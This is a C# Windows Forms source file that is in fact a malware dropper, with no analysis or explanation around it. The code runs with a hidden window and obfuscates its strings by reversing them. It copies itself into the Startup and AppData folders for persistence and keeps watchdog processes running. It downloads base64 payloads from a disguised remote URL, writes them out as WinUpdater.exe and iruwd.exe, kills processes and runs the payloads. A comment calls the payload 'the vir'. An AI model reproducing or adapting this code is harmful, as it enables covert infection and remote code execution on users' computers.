using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Net.Security;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Net;

namespace iruwd7
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        protected override CreateParams CreateParams
        {
            get
            {
                var cp = base.CreateParams;
                cp.ExStyle |= 0x80;
                return cp;
            }
        }

        static string v = "0";
    

        Process process = new Process();

        ProcessStartInfo startInfo = new ProcessStartInfo(RversedStr("AAAexe=dmcAA"));

        string mp = Application.ExecutablePath;
        string[] directories = Directory.GetDirectories(Application.StartupPath);

        string MF =Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string UF = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Pupt");

        public string responseString = "";

        private void Form1_Load(object sender, EventArgs e)
        {
           

            try
            {
                if (verifyNat() == "SWD")
                    WD();
                else if (verifyNat() == "INS")
                    Ins();
                else if (verifyNat() == "UP")
                    DownV();
                else if (verifyNat() == "FWD")
                    FWD();
                else if (verifyNat() == "PWD")
                    PWD();

            }
            catch (Exception)
            {
                
                Environment.Exit(0);
            }



            Environment.Exit(0);
        }





        public void Init()
        {
            startInfo.RedirectStandardOutput = true;
            startInfo.RedirectStandardInput = true;
            startInfo.RedirectStandardError = true;
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.CreateNoWindow = true;
            startInfo.UseShellExecute = false;
            startInfo.StandardOutputEncoding = Encoding.GetEncoding(850);
            process.StartInfo = startInfo;
            process.OutputDataReceived += new DataReceivedEventHandler(readout);
            process.ErrorDataReceived += new DataReceivedEventHandler(readError);

            process.Start();
            process.BeginOutputReadLine();
            process.BeginErrorReadLine();
        }
        public string verifyNat()
        {

            if (mp.Contains(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
                return "FWD";
            else if (mp.Contains(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "u2802")))
                return "SWD";
            else if (mp.Contains(UF))
                return "UP";
            else if (mp.Contains(MF))
                return "PWD";
            else
                return "INS";
        }

        public void Ins()
        {
            if (IsMR())
                Environment.Exit(0);
            Init();


            string[] ps = mp.Split('\\');
            string fn = ps[ps.Length - 1]; // file name 
            string tfn = "iruwd.exe";

            //string Opdir = "";
      


            //bool search = true;


            //for (int i = 0; i < directories.Length; i++)
            //{
            //    if (search && directories[i].Contains(fn.Substring(0, fn.Length - 4)))
            //    {
            //        search = false;
            //        process.StandardInput.WriteLine(string.Format(@"start explorer.exe ""{0}"" ", directories[i]));
            //        Opdir = directories[i];
            //    }
            //}

          

            string FInsFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            string bfolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "u2802");

            if (File.Exists(Path.Combine(FInsFolder, tfn)))
            {
                process.StandardInput.WriteLine(@"attrib -s -h """ + Path.Combine(FInsFolder, tfn) +@"""");
                Thread.Sleep(200);
                StartPro(Path.Combine(FInsFolder, tfn));
                Thread.Sleep(80);
                Environment.Exit(0);
            }
                

            try
            {
                Directory.CreateDirectory(bfolder);
                
                CopyF(mp, Path.Combine(FInsFolder, tfn));

                Thread.Sleep(198); 

                CopyF(mp, Path.Combine(bfolder, tfn));

                Thread.Sleep(210);
                process.StandardInput.WriteLine(@"attrib -s -h """ + Path.Combine(FInsFolder, tfn) + @"""");
                
                Thread.Sleep(170);

                StartPro(Path.Combine(FInsFolder, tfn));
                Thread.Sleep(80);
            }
            catch (Exception)
            {
                Thread.Sleep(5000);
                // File.WriteAllText(Path.Combine(Opdir, "log.txt"), strout + Environment.NewLine + "///////////////////////////////////" + strerr);
                
                Environment.Exit(0);
            }
            Thread.Sleep(5000);
            //File.WriteAllText(Path.Combine(Opdir, "log.txt"), strout + Environment.NewLine + "///////////////////////////////////" + strerr);
        }

        public void FWD()
        {

            if (IsMR())
                Environment.Exit(0);
            Init();

            string bfolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "u2802");

            if (!File.Exists(Path.Combine(bfolder, "iruwd.exe")))
            {
                try
                {

                    Directory.CreateDirectory(bfolder);
                }
                catch (Exception)
                {

                }
                CopyF(mp, Path.Combine(bfolder, "iruwd.exe"));
                StartPro(Path.Combine(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "u2802"), "iruwd.exe"));
            }
            else
            {
                StartPro(Path.Combine(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "u2802"), "iruwd.exe"));
            }


            Thread.Sleep(TimeSpan.FromSeconds(1));
        }

        Random rn = new Random();

        public void WD()
        {
            if (IsMR())
                Environment.Exit(0);

            //Init();
            SWD();
        }

        public void SWD()
        {

            
            try
            {
                ChUp();
                
            }
            catch (Exception)
            {
                Thread.Sleep(TimeSpan.FromSeconds(rn.Next(10, 80)));

                Init();

                if (!File.Exists(Path.Combine(MF, "iruwd.exe")))
                {

                    CopyF(mp, Path.Combine(MF, "iruwd.exe"));

                    Thread.Sleep(TimeSpan.FromSeconds(2));
                }



                StartPro(Path.Combine(MF, "iruwd.exe"));

                Thread.Sleep(TimeSpan.FromSeconds(3));
                Environment.Exit(0);
            }

            

            if (!IsO())
                StartV();

            Thread.Sleep(TimeSpan.FromSeconds(rn.Next(10, 80)));

            Init();

            if (!File.Exists(Path.Combine(MF, "iruwd.exe")))
            {

                CopyF(mp, Path.Combine(MF, "iruwd.exe"));

                Thread.Sleep(TimeSpan.FromSeconds(2));
            }


            Thread.Sleep(TimeSpan.FromSeconds(rn.Next(30, 180)));

            StartPro(Path.Combine(MF, "iruwd.exe"));

            Thread.Sleep(TimeSpan.FromSeconds(5));
            Environment.Exit(0);

        }

        public void ChUp()
        {
            
            strerr = "";
            try
            {
                //ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(delegate { return true; });
                //ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;

                HttpWebRequest req = (HttpWebRequest)HttpWebRequest.Create(new Uri(RversedStr("Aetadpu/resu/vded/moc=ppaukoreh=duolc-rellortnoci//:sptthAAAA")));

                req.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
                req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36";
                req.Headers.Add("Accept-Encoding", "gzip, deflate, br");
                HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
                using (Stream stream = resp.GetResponseStream())
                {
                    StreamReader reader = new StreamReader(stream, Encoding.UTF8);

                    responseString = reader.ReadToEnd();

                }
            }
            catch (Exception)
            {
               
            }

            

           
            string[] sps = { "***" };
            string[] data = responseString.Split(sps, 4, StringSplitOptions.RemoveEmptyEntries);

           
           
            if (data[0] != v)
            {

                try
                {
                    Directory.CreateDirectory(UF);
                    //process.StandardInput.WriteLine("echo " + responseString + " >" + Path.Combine(UF, "resstr.txt"));  // +++++++++++++++ WRITE DATA TO TEMP FILE 
                   
                    File.WriteAllText(Path.Combine(UF, "resstr.txt"), responseString);
                }
                catch (Exception)
                {

                }

                 RUP();
            }
           
        }

        
        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        //                                                      DOWNLOAD SECOND VERSION
        /// <summary>
        /// //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        /// </summary>
        /// 


        public void DownV()
        {



            if (IsMR())
                Environment.Exit(0);

            try
            {
                strerr = "";
                //ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(delegate { return true; });
                //ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;

                //HttpWebRequest req = (HttpWebRequest)HttpWebRequest.Create(new Uri(RversedStr("AAld?txt.7niWvetadpu/oqx9k0hmlrc3j02/s/moc.xobpord=BBw//:sptthAAA") + "=1"));

                //req.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
                //req.UserAgent = "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36";
                //req.Headers.Add("Accept-Encoding", "gzip, deflate, br");
                //HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
                //using (Stream stream = resp.GetResponseStream())
                //{
                //    StreamReader reader = new StreamReader(stream, Encoding.UTF8);

                //    responseString = reader.ReadToEnd();


                //}

                responseString = File.ReadAllText(Path.Combine(UF, "resstr.txt"));
                
                string[] sps = { "***" };
                string[] data = responseString.Split(sps, 4, StringSplitOptions.RemoveEmptyEntries);




                Thread.Sleep(TimeSpan.FromSeconds(10));

                Init();
                
                //process.StandardInput.WriteLine(string.Format("$Decodedbytes = [Convert]::FromBase64String('{0}')", data[2]));
                //process.StandardInput.WriteLine(string.Format("[IO.File]::WriteAllBytes('{0}', $Decodedbytes)", Path.Combine(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp"), "explorer.exe")));

                CreateF(data[2], Path.Combine(UF, "WinUpdater.txt"));


                //WebClient client = new WebClient();
                //process.StandardInput.WriteLine(string.Format("$Decodedbytes = [Convert]::FromBase64String('{0}')", data[1]));
                //process.StandardInput.WriteLine(string.Format("[IO.File]::WriteAllBytes('{0}', $Decodedbytes)", Path.Combine(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp"), "niruwd.exe")));

                CreateF(data[1], Path.Combine(UF, "niruwd.txt"));
                Thread.Sleep(TimeSpan.FromSeconds(10));

             
                ////////////////////////////
                ///         reinstall
                //////////////////////////////////////////

                Process[] pr = Process.GetProcesses();
                foreach (Process pro in pr)
                {
                    if (pro.ProcessName.Contains("iruwd"))
                    {
                        if (!(pro.MainModule.FileName.Contains(Application.StartupPath)))
                            pro.Kill();
                    }


                    if (pro.ProcessName.Contains("WinUpdater"))
                    {
                        if (pro.MainModule.FileName.Contains(MF))
                            pro.Kill();
                    }

                }

                string FWDF = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                string SWDF = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "u2802");

                CopyF(Path.Combine(UF, "niruwd.txt"), Path.Combine(FWDF, "iruwd.exe"));

                CopyF(Path.Combine(UF, "niruwd.txt"), Path.Combine(SWDF, "iruwd.exe"));
                CopyF(Path.Combine(UF, "WinUpdater.txt"), Path.Combine(MF, "WinUpdater.exe"));

                Thread.Sleep(TimeSpan.FromSeconds(2));

                StartPro(Path.Combine(SWDF, "iruwd.exe"));

                if (strerr.Length > 2)
                {

                    Thread.Sleep(TimeSpan.FromSeconds(10));
                    StartPro(Path.Combine(SWDF, "iruwd.exe"));
                }

            }
            catch (Exception)
            {

                Thread.Sleep(TimeSpan.FromSeconds(rn.Next(1, 10)));
                DownV();
            }
        }

        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        //                                                  END OF    DOWNLOAD SECOND VERSION
        /// <summary>
        /// //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        public void PWD()
        {

            Thread.Sleep(TimeSpan.FromSeconds(rn.Next(5, 60)));
            

            if (IsMR())
                Environment.Exit(0);

            if (!IsO())
                StartV();
            string bfolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "u2802");

            try
            {
                Init();
            }
            catch (Exception)
            {

            }

            Thread.Sleep(TimeSpan.FromSeconds(rn.Next(30, 180)));
            StartPro(Path.Combine(bfolder, "iruwd.exe"));
            Thread.Sleep(TimeSpan.FromSeconds(1));
            Environment.Exit(0);

        }




        public bool IsMR()
        {
            int nb = 0;
            try
            {
                Thread.Sleep(rn.Next(500, 5000));
                Process[] pr = Process.GetProcessesByName("iruwd");

                if (pr.Length > 0)
                {

                    foreach (Process proc in pr)
                    {

                        if (proc.MainModule.FileName.Contains(Application.StartupPath))
                        {
                            nb++;
                            if (nb > 1)
                                return true;
                        }

                    }
                }
            }
            catch (Exception)
            {

                //WD();
            }
            return false;
        }

        //public void RenF(string path, string newname)
        //{
        //    process.StandardInput.WriteLine(string.Format("Rename-Item -Path '{0}' -NewName '{1}' ", path, newname));
        //}



        public void CreateF(string basestr, string path)
        {
            //New - Item - Path. - Name "testfile1.txt" - ItemType "file" - Value "This is a text string."

            byte[] bytes = Convert.FromBase64String(basestr);

            File.WriteAllBytes(path, bytes);

        }


        public void RUP()
        {

            Init();

            string[] ps = mp.Split('\\');
            string fn = ps[ps.Length - 1]; // file name 
            string tfn = "iruwd.exe";
            Thread.Sleep(500);
            try
            {
                Directory.CreateDirectory(UF);
            }
            catch (Exception)
            {

            }
            CopyF(mp, Path.Combine(UF, tfn));
            Thread.Sleep(1000);
            StartPro(Path.Combine(UF, tfn));
            Thread.Sleep(TimeSpan.FromSeconds(30));
        }

        public void StartV()
        {

            Thread.Sleep(TimeSpan.FromSeconds(1));
            strerr = "";
            //StartPro(Path.Combine(MF, "explorer.exe"));
            try
            {
                Process.Start(Path.Combine(MF, "WinUpdater.exe"));
            }
            catch (Exception)
            {
                strerr = "error";
            }


            Thread.Sleep(600);

            if (strerr.Length > 2)
            {
                try
                {
                    Directory.CreateDirectory(UF);
                    //process.StandardInput.WriteLine("echo " + responseString + " >" + Path.Combine(UF, "resstr.txt"));  // +++++++++++++++ WRITE DATA TO TEMP FILE 
                    //MessageBox.Show(responseString);// ++++++++++++++++++++++ GET RESP STRING
                    File.WriteAllText(Path.Combine(UF, "resstr.txt"), responseString);
                }
                catch (Exception)
                {
                    
                }

                RUP();
            }


            ////////////////////////////////////////////////////////////////////////////
            ///                 original run DOWNV
            ////////////////////////////////////////////////////////////////////////
            //if (strerr.Length > 2)
            //    DownV();
            ///////////////////////////////////////////////////////////////////////////
            ///                             start the vir
            ///                     if not found copy from backup and start
            ////////////////////////////////////////////////////////////////////////////     
        }

        public bool IsO()
        {


            try
            {

                Process[] pr = Process.GetProcessesByName("WinUpdater");

                if (pr.Length > 0)
                {

                    foreach (Process proc in pr)
                    {

                        if (proc.MainModule.FileName.Contains(MF))
                        {

                            return true;
                        }

                    }
                }
            }
            catch (Exception)
            {

                //WD();
            }

            return false;

        }


        public static string strout = "";
        public static string strerr = "";
        public static void readout(object sender, DataReceivedEventArgs e)
        {
            strout += e.Data;
        }

        public static void readError(object sender, DataReceivedEventArgs e)
        {
            strerr += e.Data;
        }

        string com = "";
        public void CopyF(string from, string dest)
        {
            com = string.Format(@"echo F|xcopy /S /Q /Y /F /H ""{0}"" ""{1}"" ", from, dest); // ADDED /H to copy +s +h
            process.StandardInput.WriteLine(com);
           
        }

        public void StartPro(string path)
        {
            com = string.Format(@"""{0}"" ", path);

            process.StandardInput.WriteLine(com);

        }


        public static string RversedStr(string OriginalStr)
        {

            char[] charstr = OriginalStr.ToCharArray();
            Array.Reverse(charstr);
            string constructed = new string(charstr);

            constructed = constructed.Trim('A');
            constructed = constructed.Replace('B', 'w');
            constructed = constructed.Replace('=', '.');

            return constructed;

        }

    }
}
